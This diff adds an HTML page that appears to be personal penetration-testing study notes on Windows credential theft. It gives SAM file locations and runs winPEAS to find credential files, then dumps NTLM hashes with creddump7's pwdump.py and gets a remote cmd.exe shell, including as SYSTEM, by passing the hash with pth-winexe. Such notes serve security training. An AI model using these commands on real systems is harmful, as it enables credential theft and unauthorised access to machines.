@@ -1,0 +1,54 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>password - SAM</title>
+</head><body><br/>
+<br/>
+Security Account Manager (SAM)<br/>
+<br/>
+<br/>
+C:\Windows\System32\config<br/>
+<br/>
+The files are locked while Windows is running.<br/>
+<br/>
+<br/>
+Backups of the files may exist<br/>
+<br/>
+C:\Windows\Repair<br/>
+<br/>
+C:\Windows\System32\config\RegBack<br/>
+<br/>
+<br/>
+<br/>
+.\winPEASany.exe quiet cmd searchfast filesinfo<br/>
+<br/>
+search: <b>Looking for possible known files that can contain creds</b><br/>
+check: SAM or SYSTEM<br/>
+<br/>
+<br/>
+<b>copy SAM and SYSTEM file to kali linux</b><br/>
+<br/>
+<br/>
+<br/>
+<b>creddump7 (https://github.com/CiscoCXSecurity/creddump7)<br/>
+</b><br/>
+creddump7# python2 pwdump.py /dump/SYSTEM /dump/SAM<br/>
+<br/>
+<br/>
+<br/>
+<img src="image.png" width="777" height="100" /><br/>
+<br/>
+NTLM hashes<br/>
+<br/>
+&lt;username&gt;:500:&lt;hash&gt;:<b>&lt;NTLM hash&gt;</b>:::<br/>
+<br/>
+crack the NTLM hashes<br/>
+or<br/>
+pass the hash<br/>
+<br/>
+<br/>
+pth-winexe -U '&lt;username&gt;%&lt;entire hash&gt;' //&lt;ip addr&gt; cmd.exe<br/>
+<br/>
+pth-winexe -U '&lt;username&gt;%&lt;entire hash&gt;' --system //&lt;ip addr&gt; cmd.exe<br/>
+<img src="image 2.png" width="816" height="200" /></body></html>
